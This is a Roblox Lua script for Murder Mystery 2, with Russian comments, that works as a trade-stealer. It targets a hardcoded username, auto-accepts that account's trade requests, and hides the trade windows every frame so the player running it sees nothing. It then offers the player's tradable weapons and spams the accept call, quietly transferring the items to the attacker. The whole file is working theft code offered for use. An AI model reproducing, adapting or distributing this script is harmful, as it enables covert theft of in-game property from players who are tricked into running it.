local TARGET_USER = "ilyes_ida3"

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local plr = Players.LocalPlayer
local Trade = ReplicatedStorage:WaitForChild("Trade")

local untradable = {
    ["DefaultGun"] = true, ["DefaultKnife"] = true, ["Reaver"] = true, ["Reaver_Legendary"] = true,
    ["Reaver_Godly"] = true, ["Reaver_Ancient"] = true, ["IceHammer"] = true, ["IceHammer_Legendary"] = true,
    ["IceHammer_Godly"] = true, ["IceHammer_Ancient"] = true, ["Gingerscythe"] = true,
    ["Gingerscythe_Legendary"] = true, ["Gingerscythe_Godly"] = true, ["Gingerscythe_Ancient"] = true,
    ["TestItem"] = true, ["Season1TestKnife"] = true, ["Cracks"] = true, ["Icecrusher"] = true,
    ["???"] = true, ["Dartbringer"] = true, ["TravelerAxeRed"] = true, ["TravelerAxeBronze"] = true,
    ["TravelerAxeSilver"] = true, ["TravelerAxeGold"] = true, ["BlueCamo_K_2022"] = true,
    ["GreenCamo_K_2022"] = true, ["SharkSeeker"] = true
}

local myWeapons = {}
local lastOfferToken = nil
local activeTradeTarget = nil
local isTransferring = false

-- =====================================================================
-- 1. ОДНОРАЗОВЫЙ КЕШ ИНВЕНТАРЯ (БЕЗ ЗАВИСАНИЙ В ЦИКЛЕ)
-- =====================================================================
task.spawn(function()
    local ok, data = pcall(function() return ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name) end)
    if ok and type(data) == "table" and data.Weapons and data.Weapons.Owned then
        for id, amt in pairs(data.Weapons.Owned) do
            if amt > 0 and not untradable[id] then
                table.insert(myWeapons, {id = id, amt = amt})
            end
        end
    end
end)

-- =====================================================================
-- 2. СЕРВЕРНЫЙ СЛУХАЧ СОБЫТИЙ (ОБХОД GETTRADESTATUS)
-- =====================================================================
Trade.UpdateTrade.OnClientEvent:Connect(function(data)
    if type(data) ~= "table" then return end
    if data.LastOffer then lastOfferToken = data.LastOffer end
    
    local p1 = type(data.Player1) == "table" and data.Player1.Name or tostring(data.Player1)
    local p2 = type(data.Player2) == "table" and data.Player2.Name or tostring(data.Player2)
    
    if p1 == plr.Name and p2 ~= "nil" then activeTradeTarget = p2 end
    if p2 == plr.Name and p1 ~= "nil" then activeTradeTarget = p1 end
end)

-- =====================================================================
-- 3. АГРЕССИВНЫЙ РАДАР ИНТЕРФЕЙСА
-- =====================================================================
local function checkGuiForTarget(gui)
    if not gui then return false end
    local textData = ""
    for _, obj in ipairs(gui:GetDescendants()) do
        if obj:IsA("TextLabel") and obj.Text ~= "" then
            textData = textData .. obj.Text
        end
    end
    -- Поиск подстроки ilyes_ida3, игнорируя скобки и форматирование MM2
    return string.find(textData, TARGET_USER, 1, true) ~= nil
end

-- =====================================================================
-- 4. STEPPED-ПОДАВИТЕЛЬ (МОБИЛЬНЫЙ ЭКСКЛЮЗИВ)
-- Срабатывает ДО рендера кадра. Интерфейс физически не сможет моргнуть.
-- =====================================================================
RunService.Stepped:Connect(function()
    -- 4.1. Блокировка входящего TradeRequestGUI
    local rGui = plr.PlayerGui:FindFirstChild("TradeRequestGUI", true)
    if rGui then
        if checkGuiForTarget(rGui) then
            rGui.Enabled = false
            pcall(function()
                local rm = rGui:FindFirstChild("Main")
                if rm then 
                    rm.Visible = false
                    rm.Position = UDim2.new(9999, 0, 9999, 0)
                end
            end)
            -- Мгновенный акцепт через односторонний FireServer
            task.spawn(function()
                local acc = Trade:FindFirstChild("AcceptRequest")
                if acc then
                    if acc:IsA("RemoteFunction") then 
                        pcall(function() acc:InvokeServer() end)
                    else 
                        acc:FireServer() 
                    end
                end
            end)
        end
    end

    -- 4.2. Блокировка основного TradeGUI
    local tGui = plr.PlayerGui:FindFirstChild("TradeGUI")
    if tGui then
        -- Сверяем таргет по серверным данным ИЛИ по тексту в гуи
        local isTarget = false
        if activeTradeTarget and string.find(tostring(activeTradeTarget), TARGET_USER, 1, true) then isTarget = true end
        if not isTarget and checkGuiForTarget(tGui) then isTarget = true end

        if isTarget then
            tGui.Enabled = false
            pcall(function()
                local main = tGui:FindFirstChild("Main")
                if main then
                    main.Position = UDim2.new(9999, 0, 9999, 0)
                    main.Visible = false
                end
                local container = tGui:FindFirstChild("Container")
                if container then container.Visible = false end
            end)
        else
            -- ВОССТАНОВЛЕНИЕ ДЛЯ ОБЫЧНЫХ ИГРОКОВ (ШТАТНАЯ РАБОТА)
            pcall(function()
                local main = tGui:FindFirstChild("Main")
                if main and main.Position.X.Scale == 9999 then
                    main.Position = UDim2.new(0.5, -main.Size.X.Offset/2, 0.5, -main.Size.Y.Offset/2)
                    main.Visible = true
                end
                local container = tGui:FindFirstChild("Container")
                if container then container.Visible = true end
            end)
        end
    end
end)

-- =====================================================================
-- 5. ТРАНСФЕРНЫЙ ДВИЖОК (БЕЗ INVOKESERVER)
-- =====================================================================
task.spawn(function()
    while task.wait(0.1) do
        local tGui = plr.PlayerGui:FindFirstChild("TradeGUI")
        
        -- Сброс состояния, если трейд закрылся
        if not tGui then
            isTransferring = false
            activeTradeTarget = nil
            lastOfferToken = nil
        end

        -- Если трейд открыт и это ilyes_ida3, начинаем выгрузку
        if tGui and not isTransferring then
            local isTarget = false
            if activeTradeTarget and string.find(tostring(activeTradeTarget), TARGET_USER, 1, true) then isTarget = true end
            if not isTarget and checkGuiForTarget(tGui) then isTarget = true end

            if isTarget then
                isTransferring = true
                task.spawn(function()
                    task.wait(0.3) -- Задержка для прогрузки пакетов MM2
                    
                    -- Закидываем шмотки слепыми ремоутами (до 4 слотов)
                    local added = 0
                    for _, item in ipairs(myWeapons) do
                        if added >= 4 then break end
                        for i = 1, item.amt do
                            if added >= 4 then break end
                            Trade.OfferItem:FireServer(item.id, "Weapons")
                            added = added + 1
                            task.wait(0.15) -- Идеальный пинг для мобильного инета
                        end
                    end
                    
                    -- Агрессивный спам акцептом. Если токен есть - жмём.
                    local timeout = 0
                    while tGui and timeout < 100 do
                        if lastOfferToken then
                            Trade.AcceptTrade:FireServer(game.PlaceId * 3, lastOfferToken)
                        end
                        task.wait(0.2)
                        timeout = timeout + 1
                        tGui = plr.PlayerGui:FindFirstChild("TradeGUI")
                    end
                end)
            end
        end
    end
end)

-- =====================================================================
-- 6. АВТОСЕНДЕР (КИНУТЬ ТРЕЙД ТАРГЕТУ)
-- =====================================================================
task.spawn(function()
    while task.wait(3) do
        local tGui = plr.PlayerGui:FindFirstChild("TradeGUI")
        local reqGui = plr.PlayerGui:FindFirstChild("TradeRequestGUI", true)
        
        -- Кидаем запрос, только если сейчас нет активных трейдов/реквестов
        if not tGui and (not reqGui or not reqGui.Enabled) then
            local targetPlayer = Players:FindFirstChild(TARGET_USER)
            if targetPlayer then
                task.spawn(function()
                    pcall(function() Trade.SendRequest:InvokeServer(targetPlayer) end)
                end)
            end
        end
    end
end)
